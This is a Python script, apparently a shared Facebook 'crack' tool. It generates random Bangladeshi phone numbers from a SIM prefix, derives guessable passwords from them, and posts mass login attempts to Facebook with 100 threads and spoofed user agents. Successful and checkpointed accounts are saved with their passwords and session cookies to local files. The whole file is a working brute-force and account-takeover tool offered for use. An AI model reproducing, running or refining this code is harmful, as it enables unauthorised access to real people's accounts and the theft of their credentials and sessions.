import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system('https://www.facebook.com/profile.php?id=100000739035643')
logo=("""
\033[1;32m┏━┓╻ ╻┏┳┓┏━╸╺┳┓   ┏━╸┏━┓┏━┓╻ ╻┏━┓┏┓╻\033[1;37m
\033[1;32m┣━┫┣━┫┃┃┃┣╸  ┃┃   ┣╸ ┣━┫┣┳┛┣━┫┣━┫┃┗┫
\033[1;32m╹ ╹╹ ╹╹ ╹┗━╸╺┻┛   ╹  ╹ ╹╹┗╸╹ ╹╹ ╹╹ ╹\033[1;37m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m>\033[1;32m> \033[1;34mMaked By : AHMED FARHAN
\033[1;31m>\033[1;32m> \033[1;36mFacebook : AHMED FARHAN
\033[1;31m>\033[1;32m> \033[1;38mGit-Hub  : AHMED-143 \033[1;37m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def mueor():
    user=[]
    os.system('clear')
   # os.system('https://facebook.com/groups/364057229910533/')
    print(logo)
    print('[+] SIM CODE BD  016 017 018 019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as MUEOR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m≈\033[1;37m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m≈\033[1;37m] TOTAL ID : '+tl)
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud]
            MUEOR.submit(rcrack,uid,pwx,tl)
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sFARHAN\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://d.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'd.facebook.com',
            'method': 'GET',
            'path': '/',
            'scheme': 'https',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=Zgb7ZeT1v_DOKL_60fjtzqhn; sb=Zgb7ZZ0oxcOL0gr5CJBpK3oS; m_pixel_ratio=1.8000000715255737; wd=400x755; ps_l=0; ps_n=0; fr=0aMFbH0PhFEAxD6jU..Bl-wZm..AAA.0.0.Bl-wZx.AWWwtZfaAxo',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2006C3MII"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
			'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' 
			'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'
			'Mozilla/5.0 (Linux; Android 11; Galaxy S20 Ultra) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.43'
			'Mozilla/5.0 (Linux; arm_64; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2335.105 Mobile Safari/537.36'
			'Mozilla/5.0 (Linux; arm_64; Android 11; ONEPLUSA5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36 YandexSearch/8.60'
			'Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'
			'Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'
			'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848'
			'Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526'
			'Mozilla/5.0 (Linux; Android 13; SM-A526B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022146282'
			'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.78.201'
			'Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526'
			'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'
			'Mozilla/5.0 (Linux; Andr0id 10; BRAVIA VH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 OPR/46.0.2207.0 OMI/4.21.0.273.DIA6.228 HbbTV/1.5.1 (+DRM; Sony; KE-65XH9096; PKG6.2126.0237EUA; ; com.sony.HE.G4.4K; ) sony.hbbtv.tv.G4.2020HE.4K LaTivu_1.0.1_2021'
			'Mozilla/5.0 (Linux; Android 13; CPH2197 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]'
			'Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.3.108;]'
			'Dalvik/2.1.0 (Linux; U; Android 11; M7i Build/RP1A.201005.001)'
			'Mozilla/5.0 (Linux; Android 11; SM-G781B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',}
            lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[FARHAN-OK💚] {uid} • {ps}" '  \n\033[1;33m [🥱]\033[1;33mCookie = '+coki+ ' ')
                open('/sdcard/FARHAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[FARHAN-CP💔] {uid} • {ps}")
                open('/sdcard/FARHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

mueor()
